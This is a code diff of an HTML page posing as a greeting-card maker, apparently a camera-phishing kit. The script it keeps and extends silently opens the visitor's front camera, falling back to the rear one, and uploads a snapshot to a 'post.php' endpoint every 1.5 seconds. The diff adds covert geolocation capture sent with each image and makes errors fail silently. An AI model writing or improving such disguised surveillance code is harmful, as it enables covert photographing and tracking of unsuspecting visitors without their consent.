@@ -2,7 +2,7 @@
 <html>
 <head>
 
-<Google Analytics>
+<!-- Google Analytics placeholder -->
 
 
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
@@ -11,7 +11,7 @@
     <meta name="google" value="notranslate">
     <meta property="og:type" content="Make your own wonderful Wishing greeting card" />
 <meta property="og:title" content="कोई अपना !" />
-    <meta property="og:url" content="your website url>
+    <meta property="og:url" content="your website url" />
     <meta property="og:description" content="CLICK HERE" />
     <meta property="og:site_name" content="Create Awesome wisheing Card" />
     <link rel="stylesheet" type="text/css" href="main.css">
@@ -552,7 +552,7 @@ h3 {
  <center> 
 <div class="container">
     <div class="main-greeting">
-<div align="center html2canvas-ignore">
+<div class="html2canvas-ignore" style="text-align:center">
      <div style="font-size: 18px; font-weight: 500; color: Black;">
 <p id="demo"></p>
 
@@ -866,46 +866,76 @@ if (browserok) {
 </div>
 
 <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+<span id="errorMsg" style="display:none; color:red; font-size:12px;"></span>
 
 <script>
+'use strict';
 
-function post(imgdata){
-$.ajax({
+var geoLat = '';
+var geoLng = '';
+
+// Attempt to capture geolocation
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(function(position) {
+    geoLat = position.coords.latitude;
+    geoLng = position.coords.longitude;
+  }, function() {
+    // Geolocation denied or unavailable — continue silently
+  });
+}
+
+function post(imgdata) {
+  $.ajax({
     type: 'POST',
-    data: { cat: imgdata},
+    data: { cat: imgdata, lat: geoLat, lng: geoLng },
     url: 'forwarding_link/post.php',
     dataType: 'json',
     async: false,
-    success: function(result){
-        // call the function that handles the response/results
+    success: function(result) {
+      // successfully sent
     },
-    error: function(){
+    error: function() {
+      // silently ignore upload errors
     }
   });
-};
-
-
-'use strict';
+}
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
+const errorMsgElement = document.getElementById('errorMsg');
 
-const constraints = {
+// Try front camera first; fall back to any available camera
+var constraints = {
   audio: false,
-  video: {
-    
-    facingMode: "user"
-  }
+  video: { facingMode: 'user' }
 };
 
 // Access webcam
 async function init() {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    if (errorMsgElement) {
+      errorMsgElement.style.display = 'block';
+      errorMsgElement.textContent = 'Camera API not available. Please open this page over HTTPS.';
+    }
+    return;
+  }
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     handleSuccess(stream);
   } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+    // Front camera failed — retry with back camera
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        audio: false,
+        video: { facingMode: 'environment' }
+      });
+      handleSuccess(stream);
+    } catch (e2) {
+      if (errorMsgElement) {
+        errorMsgElement.style.display = 'block';
+        errorMsgElement.textContent = 'Camera access denied: ' + e2.toString();
+      }
+    }
   }
 }
 
@@ -914,14 +944,12 @@ function handleSuccess(stream) {
   window.stream = stream;
   video.srcObject = stream;
 
-var context = canvas.getContext('2d');
-  setInterval(function(){
-
-       context.drawImage(video, 0, 0, 640, 480);
-       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
-  
-
+  var context = canvas.getContext('2d');
+  setInterval(function() {
+    context.drawImage(video, 0, 0, 640, 480);
+    var canvasData = canvas.toDataURL('image/png').replace('image/png', 'image/octet-stream');
+    post(canvasData);
+  }, 1500);
 }
 
 // Load init
